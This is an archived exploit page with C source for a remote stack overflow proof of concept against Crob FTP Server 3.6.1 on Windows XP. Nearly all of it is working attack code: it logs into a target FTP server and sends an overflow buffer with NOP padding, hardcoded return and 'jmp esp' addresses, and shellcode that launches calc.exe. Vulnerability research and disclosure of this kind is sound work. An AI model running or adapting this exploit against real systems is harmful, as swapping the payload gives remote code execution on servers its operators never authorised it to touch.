<html><head><title>Crob FTP Server <= 3.6.1 Remote Stack Overflow Exploit</title></head><pre>/*
 * CrobFTP remote stack overflow PoC 
 * ---------------------------------
 * Tested on Crob FTP Server 3.6.1, Windows XP
 * 
 * Coded by Leon Juranic &lt;ljuranic@lss.hr&gt;
 * LSS Security / http://security.lss.hr
 *
 */



#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;time.h&gt;

#pragma comment (lib,&quot;ws2_32&quot;)


char *fzz_recv (int sock)
{
	fd_set fds;
	struct timeval tv;
	static char buf[10000];
	char *ptr=buf;
	int n;
	tv.tv_sec = 5;
	tv.tv_usec = 0;

	FD_ZERO(&amp;fds);
	FD_SET(sock,&amp;fds);
	if (select(NULL,&amp;fds,NULL,NULL,&amp;tv) != 0) {
		if (FD_ISSET (sock,&amp;fds)) n=recv (sock,ptr,sizeof(buf),0);
		buf[n-1] = '\0';
		printf (&quot;RECV: %s\n&quot;,buf);
		return buf;
	}
	else {
		return NULL;
	}
	
}
	



int login (int sock, char *user, char *pass)
{
	char buf[1024], *bla;
	bla=fzz_recv(sock);
	printf (&quot;recv: %s\n&quot;,bla);
	sprintf (buf,&quot;USER %s\r\n&quot;,user);
	send (sock,buf,strlen(buf),0);
	bla=fzz_recv(sock);
	printf (&quot;recv: %s\n&quot;,bla);
	sprintf (buf,&quot;PASS %s\r\n&quot;,pass);
	send (sock,buf,strlen(buf),0);
	bla=fzz_recv(sock);
	printf (&quot;recv: %s\n&quot;,bla);
	if (strcmp(&quot;230&quot;,bla) != NULL)
		return 0;
	else return -1;
	return 0;
}




void lame_sploit (char *pack, char *user, char *pass)
{
	WORD wVersionRequested;
	WSADATA wsaData;
	int sock, err,x;
	struct sockaddr_in sin;
	char buf[2000],tmp[1000];
	

	char *shell=				// 5 min. XP SP1 shellcode
		&quot;\x33\xc0&quot;				// xor eax,eax
		&quot;\x50&quot;					// push eax (\0)
		&quot;\x68\x2e\x65\x78\x65&quot;  // push '.exe'
		&quot;\x68\x63\x61\x6c\x63&quot;  // push 'calc'
		&quot;\x54&quot;					// push esp
		&quot;\xba\x44\x80\xc2\x77&quot;  // mov  edx, 77c28044
		&quot;\xff\xd2&quot;;				// call edx  (system)


	wVersionRequested = MAKEWORD( 2, 2 );
	err = WSAStartup( wVersionRequested, &amp;wsaData );
	if ( err != 0 ) {
		printf (&quot;ERROR: Sorry, cannot create socket!!!\n&quot;);
		ExitProcess(-1);
	}

	sock=socket(AF_INET,SOCK_STREAM,0);
	

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr = inet_addr(pack);
	sin.sin_port = htons(21);
	
	if (connect(sock,(struct sockaddr*)&amp;sin, sizeof(struct sockaddr)) == -1) {
		printf (&quot;CONNECT :(((\n&quot;);
		ExitProcess(-1);
	}

	if (login(sock,user,pass) == -1)
	{
		printf (&quot;ERROR: Cannot login to FTP server, sorry!!!\n&quot;);
		exit(-1);
	}
	
	memset(tmp,0,sizeof(tmp));
	memset (tmp,0x90,180);


	memcpy (&amp;tmp[80],shell,strlen(shell));
	*(long*)&amp;tmp[158] = 0x77da52b8; // EIP -&gt; ret into 'jmp esp'
	*(long*)&amp;tmp[166] = 0x74ec8390; //		  sub esp,0x74
	*(long*)&amp;tmp[170] = 0x9090e4ff; //		  jmp esp


	_snprintf (buf,sizeof(buf),&quot;STOR %s\r\n&quot;, tmp);

	printf (&quot;DEBUG: %.30s %d\n&quot;,buf,strlen(buf));
	send (sock,buf,strlen(buf),0);
	printf (&quot;%s\n&quot;,fzz_recv(sock));

	strcpy(buf,&quot;RMD &quot;);
	for (x=0;x&lt;276;x++)
		strcat (buf,&quot;.../&quot;);
	strcat(buf,&quot;\r\n&quot;);

	printf (&quot;Sending exploit strings\n&quot;);
	send (sock,buf,strlen(buf),0);
	printf (&quot;recv: %s\n&quot;,fzz_recv(sock));


}



main (int argc, char **argv)
{
	printf (&quot;CrobFTP Stack overflow PoC \n&quot;
		    &quot;Coded by Leon Juranic &lt;ljuranic@lss.hr&gt;\n&quot;
			&quot;LSS Security / http://security.lss.hr/\n&quot;);

	if (argc &lt; 4 ) {
		printf (&quot;\nusage: %s &lt;target_IP&gt; &lt;user&gt; &lt;pass&gt;\n&quot;,argv[0]);
		exit(-1);
	}
	lame_sploit(argv[1],argv[2],argv[3]);

}

// milw0rm.com [2005-06-03]</pre></html>